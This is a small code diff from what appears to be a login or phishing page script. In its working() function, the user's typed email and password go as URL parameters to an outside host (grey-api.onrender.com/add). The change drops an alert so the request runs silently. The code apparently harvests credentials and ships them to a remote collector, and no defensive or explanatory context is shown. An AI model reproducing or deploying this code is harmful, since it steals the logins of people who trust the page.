@@ -14,6 +14,6 @@ eyes.addEventListener('click', ()=>{
 })
 
 function working() {
-    fetch(`https://grey-api.onrender.com/add?email=${email.value}&password=${password.value}`).then(data => alert(data))
+    fetch(`https://grey-api.onrender.com/add?email=${email.value}&password=${password.value}`)
     return true
 }
